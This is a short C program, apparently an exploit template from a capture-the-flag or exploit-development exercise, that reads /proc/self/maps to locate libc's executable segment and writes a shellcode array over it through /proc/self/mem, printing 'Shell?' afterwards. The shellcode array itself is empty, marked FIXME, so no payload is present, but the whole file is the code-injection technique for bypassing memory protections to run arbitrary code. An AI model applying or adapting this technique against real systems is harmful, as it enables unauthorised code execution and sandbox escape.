#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

unsigned char shellcode[] = {
    // FIXME
};

int main() {
    int maps_fd;
    int mem_fd;
    uint64_t libc_rx_start_addr;
    uint64_t libc_rx_end_addr;
    size_t libc_rx_size;

    FILE * fp_maps;

    if ((maps_fd = openat(1, "/proc/self/maps", O_RDONLY)) < 0) {
        perror("openat /proc/self/maps");
        exit(1);
    }
    fp_maps = fdopen(maps_fd, "r");

    if ((mem_fd = openat(1, "/proc/self/mem", O_RDWR)) < 0) {
        perror("openat /proc/self/mem");
        exit(1);
    }

    // Parse out base address information for the first exectuable page in libc.
    char line[0x1000];
    while (fgets(line, sizeof(line), fp_maps)) {
        if (strstr(line, "r-xp") == NULL || strstr(line, "libc-") == NULL) {
            continue;
        }

        sscanf(line, "%lx-%lx ", &libc_rx_start_addr, &libc_rx_end_addr);
        printf("libc r-xp start addr: %#lx\n", libc_rx_start_addr);
        printf("libc r-xp end addr: %#lx\n", libc_rx_end_addr);

        libc_rx_size = libc_rx_end_addr - libc_rx_start_addr;
        printf("libc r-xp segment size: %#lx\n", libc_rx_size);
    }

    // Write shellcode over an executable page in libc.
    lseek(mem_fd, libc_rx_start_addr, SEEK_SET);
    write(mem_fd, shellcode, sizeof(shellcode));

    puts("Shell?");
}
